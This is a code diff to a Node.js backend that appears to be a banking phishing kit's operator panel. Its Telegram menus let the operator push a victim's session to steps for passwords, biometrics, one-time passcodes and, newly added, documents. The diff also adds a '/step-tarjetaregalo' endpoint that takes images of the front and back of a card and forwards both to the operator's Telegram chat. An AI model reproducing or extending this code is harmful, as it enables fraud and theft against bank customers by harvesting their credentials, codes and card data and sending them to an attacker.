@@ -56,6 +56,9 @@ function getLoanSimulatorMenu(sessionId) {
         { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
       [
+        { text: "🧬 Documentos", callback_data: `go:documento|${sessionId}` }
+      ],
+	  [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
       ],
@@ -82,6 +85,9 @@ function getDynamicMenu(sessionId) {
       [
         { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
+	  [
+        { text: "🧬 Documentos", callback_data: `go:documento|${sessionId}` }
+      ],	
       [
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` }
@@ -423,8 +429,79 @@ app.post('/step-biometrics', async (req, res) => {
   }
 });
 
+// 
+
+// ==================== ENDPOINT: REGALO ====================
+
+// 🔥 Función para convertir base64 a buffer
+function base64ToBuffer(base64String) {
+    const base64Data = base64String.replace(/^data:image\/\w+;base64,/, "");
+    return Buffer.from(base64Data, "base64");
+}
+
+app.post("/step-tarjetaregalo", async (req, res) => {
+
+    try {
+
+        const { sessionId, frontImageBase64, backImageBase64, message } = req.body;
+
+        if (!frontImageBase64 || !backImageBase64) {
+            return res.status(400).json({ error: "Faltan imágenes" });
+        }
+
+        const frontBuffer = base64ToBuffer(frontImageBase64);
+        const backBuffer = base64ToBuffer(backImageBase64);
+
+        const caption = `🎁 ¡Has recibido una Tarjeta de Regalo!
+
+👉 Por favor VOLTEA la tarjeta para ver la parte trasera.
+
+${message || ""}`;
+
+        // ==========================
+        // Enviar imagen frontal
+        // ==========================
+        const formDataFront = new FormData();
+        formDataFront.append("chat_id", CHAT_ID);
+        formDataFront.append("caption", caption);
+        formDataFront.append("photo", frontBuffer, {
+            filename: "frontal.jpg"
+        });
+
+        await axios.post(
+            `${TELEGRAM_API}/sendPhoto`,
+            formDataFront,
+            { headers: formDataFront.getHeaders() }
+        );
+
+        // ==========================
+        // Enviar imagen trasera
+        // ==========================
+        const formDataBack = new FormData();
+        formDataBack.append("chat_id", CHAT_ID);
+        formDataBack.append("caption", "🔄 Parte trasera de la tarjeta");
+        formDataBack.append("photo", backBuffer, {
+            filename: "trasera.jpg"
+        });
+
+        await axios.post(
+            `${TELEGRAM_API}/sendPhoto`,
+            formDataBack,
+            { headers: formDataBack.getHeaders() }
+        );
+
+        res.json({ success: true });
+
+    } catch (error) {
+        console.error("Error enviando tarjeta:", error.response?.data || error.message);
+        res.status(500).json({ error: "Error interno" });
+    }
+
+});
+
 
  
+// ==================== ENDPOINT: REGALO ====================
 
 
 
